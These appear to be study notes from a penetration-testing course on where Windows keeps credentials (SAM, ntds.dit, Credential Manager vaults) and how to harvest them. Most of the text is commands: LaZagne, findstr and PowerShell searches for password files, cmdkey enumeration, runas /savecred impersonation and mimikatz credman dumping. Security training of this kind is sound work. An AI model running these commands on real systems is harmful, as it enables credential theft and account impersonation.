# Storage
## SAM
Stored in the Security Account Manager (SAM) - database file 
LM hash or NTLM hash 
`%SystemRoot%/system32/config/SAM`
if computer in workgroup -> handles SAM database locally
in domain -> domain controller validate credentials from active directory databse (ntds.dit) in `%SystemRoot%\ntds.dit`

## Credential Locker 
allows users to save credentials they use to access various network resources and websites 
`C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\`


# Harvesting 

lazagne (saved in /home/hnin)
copy it over to the targetn (legit just ctrl-c, v)

```
start lazagne.exe all
```

cmdline
```
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

counting files cmd
n: -> is the drive
```
dir n: /a-d /s /b | find /c ":\"
```

```cmd-session
n:\*cred* /s /b
```

```cmd-session
n:\*secret* /s /b
```

powershell 
```
(Get-ChildItem -File -Recurse | Measure-Object).Count
```

```powershell-session
Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
```

this is finding the string in the file btw
```powershell-session
Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
```
## Attacking Windows Credentials Manager
Credentials are stored in special encrypted folders on the computer under the user and system profiles ([MITRE ATT&CK](https://attack.mitre.org/techniques/T1555/004/)):

- `%UserProfile%\AppData\Local\Microsoft\Vault\`
- `%UserProfile%\AppData\Local\Microsoft\Credentials\`
- `%UserProfile%\AppData\Roaming\Microsoft\Vault\`
- `%ProgramData%\Microsoft\Vault\`
- `%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\`


Each vault folder contains a `Policy.vpol` file with AES keys (AES-128 or AES-256) that is protected by DPAPI. These AES keys are used to encrypt the credentials.


Export Windows Vaults to .crd files 

```
rundll32 keymgr.dll,KRShowKeyMgr
```


Use cmdkey to enumerate credentials 
```
whoami 


cmdkey /list
```
if we run into credentials that are domain credentials like `machine\user` then we can impersonate the stored user
```
runas /savecred /usr:machine\user cmd
```

you can also use mimikatz
```
privilege::debug
sekurlsa::credman
```